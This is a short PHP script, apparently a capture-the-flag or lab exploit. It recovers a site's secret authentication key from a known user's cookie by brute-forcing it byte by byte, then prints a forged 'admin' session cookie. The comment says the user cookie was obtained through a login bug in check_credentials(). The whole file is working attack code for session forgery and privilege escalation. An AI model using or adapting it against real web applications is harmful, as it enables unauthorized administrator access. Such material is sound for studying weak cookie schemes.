<?php

// Taken from browser cookies after login as 'nill' due to a bug
// in check_credentials() in file auth.php
$user = 'nill';
$auth = '1c919b2d62b178f3c713bb5431c57cc1';

$auth_key_codes = calculate_auth_key($user, $auth);
echo create_auth_cookie('admin', $auth_key_codes), PHP_EOL;

function calculate_auth_key($user, $auth) {
  $codes = array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  for ($i = 0; $i < count($codes); $i++) {
    for ($j = 1; $j < 256; $j++) {
      $codes[$i] = $j;
      $hash = create_auth_cookie($user, $codes);
      if (substr($hash, 0, ($i + 1) * 2) === substr($auth, 0, ($i + 1) * 2)) {
        break;
      }
    }
  }
  return $codes;
}

function get_auth_key($codes) {
  $auth = '';
  for ($i = 0; $i < count($codes); $i++) {
    $auth .= chr($codes[$i]);
  }
  return $auth;
}

function create_auth_cookie($user, $codes) {
  $authKey = get_auth_key($codes);

  $userMd5 = md5($user, true);

  $result = '';
  for ($i = 0; $i < strlen($userMd5); $i++) {
    $result .= bin2hex(chr((ord($authKey[$i]) + ord($userMd5[$i])) % 256));
  }
  return $result;
}
